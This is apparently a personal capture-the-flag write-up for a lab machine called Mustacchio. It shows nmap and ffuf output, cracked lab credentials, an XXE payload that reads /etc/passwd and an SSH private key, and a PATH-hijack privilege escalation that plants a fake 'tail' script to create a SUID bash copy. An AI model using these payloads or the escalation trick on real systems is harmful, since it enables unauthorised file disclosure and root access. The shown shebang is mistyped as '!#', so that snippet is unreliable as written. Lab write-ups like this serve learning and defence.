# Mustacchio
### Users
```
joe
barry
```
### Credentials
```
barry:urieljames

Port 8765
admin:bulldog19
```
## Recon
### Nmap Scan
```
Nmap scan report for 10.10.115.141
Host is up (0.076s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Web Recon
**Port 80:**
* Server: Apache 2.4.18
**Port 8765:**
* Server nginx 1.10.3
#### Fuzzing
```
/FUZZ - raft-files
 :: Method           : GET
 :: URL              : http://10.10.115.141/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 __________________________________________
index.html              [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 53ms]
contact.html            [Status: 200, Size: 1450, Words: 68, Lines: 52, Duration: 54ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 56ms]
robots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3, Duration: 326ms]
about.html              [Status: 200, Size: 3152, Words: 331, Lines: 65, Duration: 54ms]
blog.html               [Status: 200, Size: 3172, Words: 274, Lines: 84, Duration: 53ms]
gallery.html            [Status: 200, Size: 1950, Words: 69, Lines: 91, Duration: 142ms]
wp-forum.phps           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 53ms]
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 54ms]
.htuser                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 54ms]


/FUZZ/ - raft-dirs
 :: Method           : GET
 :: URL              : http://10.10.115.141/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

images                  [Status: 200, Size: 6168, Words: 308, Lines: 42, Duration: 55ms]
fonts                   [Status: 200, Size: 1144, Words: 76, Lines: 18, Duration: 56ms]
icons                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 57ms]
custom                  [Status: 200, Size: 1116, Words: 76, Lines: 18, Duration: 54ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 53ms]
```
## Foothold / Privilege Escalation
### Initial Foothold
Using ffuf I found a /custom directory under the web root. Inside a file named users.bak
seemed interesting. It was a sqlite3 type file so when viewing it I found an admin username
and his password hash. Using john I was able to crack the hash and login on port 8765.
Inside the admin panel we could leave a comment and viewing the request in burp it was an
XML type of data being given to the server so I tested for XXE and was successful.
Using:
```
xml=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```
payload and then URL encoding it I was able to read the /etc/password, and in the response
body I found a comment reminding the user barry that he can use his ssh key to log in so 
I used the XXE vulnerability to read id_rsa of the user barry and was able to crack it and ssh in the machine as the user barry.
### Privilege Escalation
To elevate my privileges I ran a typical check for linux boxes and when checking the SUID
binaries I found an interesting binary; **/home/joe/live_log**, which when ran would give me
last log entries for the web server. Inspecting it with strings on my machine I found
the exact command used "tail" but without a specified path. So testing if I could
manipulate the path variable proved successful.
I made a malicious tail binary in the /dev/shm directory and then appended that directory to the BEGINNING of the path.
In the malicious binary was the payload:
```
!#/bin/bash
cp /bin/bash /tmp/bash
chmod 4777 /tmp/bash
```
And when live_log executed tail it would execute our malicious binary and copy the /bin/bash binary to the /tmp/ directory and giving it the SUID bit. 
When executed, the /tmp/bash binary with -p flag for elevated privileges it gives us a root shell.
## Notes
* When using the PATH variable manipulation exploit, the directory where the malicious binary is needs to be on the BEGINNING of the PATH variable.